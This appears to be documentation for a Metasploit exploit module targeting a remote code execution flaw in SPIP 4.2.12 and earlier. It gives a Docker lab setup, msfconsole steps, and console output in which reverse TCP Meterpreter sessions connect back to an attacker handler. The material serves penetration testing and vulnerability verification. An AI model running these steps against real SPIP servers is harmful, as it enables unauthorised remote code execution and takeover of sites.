## Vulnerable Application

This Metasploit module exploits a Remote Code Execution vulnerability in SPIP versions up to and including 4.2.12.
The vulnerability occurs in SPIP’s templating system where it incorrectly handles user-supplied input, allowing an attacker
to inject and execute arbitrary PHP code.
This can be achieved by crafting a payload that manipulates the templating data processed by the `echappe_retour()` function,
which invokes `traitements_previsu_php_modeles_eval()`, containing an `eval()` call.

To replicate a vulnerable environment for testing:

1. Install SPIP using the provided Docker Compose configuration.
2. Use the image `ipeos/spip:4.2.12` to ensure the environment is vulnerable.
3. Verify that the SPIP instance is accessible on the local network.

### Docker Setup

Use the following Docker Compose file to set up the environment:

```yaml
version: '3.8'

services:
  db:
    image: mariadb:10.5
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=MysqlRootPassword
      - MYSQL_DATABASE=spip
      - MYSQL_USER=spip
      - MYSQL_PASSWORD=spip
    networks:
      - spip-network

  app:
    image: ipeos/spip:4.2.12
    restart: always
    depends_on:
      - db
    environment:
      - SPIP_AUTO_INSTALL=1
      - SPIP_DB_SERVER=db
      - SPIP_DB_LOGIN=spip
      - SPIP_DB_PASS=spip
      - SPIP_DB_NAME=spip
      - SPIP_SITE_ADDRESS=http://localhost:8880
    ports:
      - 8880:80
    networks:
      - spip-network

networks:
  spip-network:
    driver: bridge
```

## Verification Steps

1. Set up a SPIP instance with the specified Docker environment.
2. Launch `msfconsole` in your Metasploit framework.
3. Use the module: `use exploit/multi/http/spip_porte_plume_previsu_rce`.
4. Set `RHOSTS` to the local IP address or hostname of the target.
5. Configure necessary options such as `TARGETURI`, `SSL`, and `RPORT`.
6. Execute the exploit using the `run` or `exploit` command.
7. If the target is vulnerable, the module will execute the specified payload.

## Options

No additional options are required for basic exploitation.

## Scenarios

### Successful Exploitation Against Local SPIP 4.2.12

**Setup**:

- Local SPIP instance with version 4.2.12.
- Metasploit Framework.

**Steps**:

1. Start `msfconsole`.
2. Load the module:
```
use exploit/multi/http/spip_porte_plume_previsu_rce
```
3. Set `RHOSTS` to the local IP (e.g., 127.0.0.1).
4. Configure other necessary options (TARGETURI, SSL, etc.).
5. Launch the exploit:
```
exploit
```

**Expected Results**:

With `php/meterpreter/reverse_tcp`:

```
msf6 exploit(multi/http/spip_porte_plume_previsu_rce) > exploit rhosts=127.0.0.1 rport=8880 AutoCheck=false

[*] Started reverse TCP handler on 192.168.1.36:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Sending exploit payload to the target...
[*] Sending stage (39927 bytes) to 172.23.0.3
[*] Meterpreter session 1 opened (192.168.1.36:4444 -> 172.23.0.3:35902) at 2024-08-10 21:56:50 +0200

meterpreter > sysinfo
Computer    : 5d309f4bdfbe
OS          : Linux 5d309f4bdfbe 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64
Meterpreter : php/linux
meterpreter > 
```

With `cmd/linux/http/x64/meterpreter/reverse_tcp`:

```
msf6 exploit(multi/http/spip_porte_plume_previsu_rce) > exploit rhosts=127.0.0.1 rport=8880 AutoCheck=false

[*] Started reverse TCP handler on 192.168.1.36:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Preparing to send exploit payload to the target...
[*] Sending exploit payload to the target...
[*] Sending stage (3045380 bytes) to 172.23.0.3
[*] Meterpreter session 3 opened (192.168.1.36:4444 -> 172.23.0.3:38992) at 2024-08-10 22:10:19 +0200

meterpreter > sysinfo 
Computer     : 172.23.0.3
OS           : Debian 11.9 (Linux 5.15.0-113-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```

- The module successfully exploits the vulnerability and opens a Meterpreter session on the target.

**Note**: Ensure the SPIP instance is correctly configured and running in the Docker environment for the exploit to work as expected.
